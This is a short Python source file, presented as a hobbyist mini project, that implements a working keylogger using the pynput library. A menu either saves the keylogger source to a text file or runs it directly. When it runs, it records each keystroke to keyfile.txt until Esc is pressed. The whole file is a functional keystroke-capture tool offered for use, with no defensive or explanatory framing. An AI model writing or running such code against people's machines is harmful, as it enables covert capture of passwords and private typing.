# This is a keyloagger if you dont know what is a keylogger please search on google.
# It will create a keyfile.txt automatically when you start typing in the terminal.
# This is a mini project.
# All the best.
from pynput import keyboard

def main_menu():
    print("\nMain Menu:")
    print("1. Save this code to a .txt file")
    print("2. Execute keylogger directly")
     
    choice = input("Enter your choice (1 or 2): ")
    return choice

def save_code_to_file():
    code = """
from pynput import keyboard

def on_press(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write('[' + str(key) + ']')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
"""
    with open("keylogger_code.txt", "w") as file:
        file.write(code)
    print("Code has been saved to keylogger_code.txt")

def on_press(key):
    print(str(key))
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            logkey.write('[' + str(key) + ']')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Press 'Ctrl + C' to terminate and go to the main menu.")

    while True:
        choice = main_menu()
        if choice == "1":
            save_code_to_file()
        elif choice == "2":
            print("Executing keylogger directly...")
            keylogger()
        else:
            print("Invalid choice. Please enter 1 or 2.")
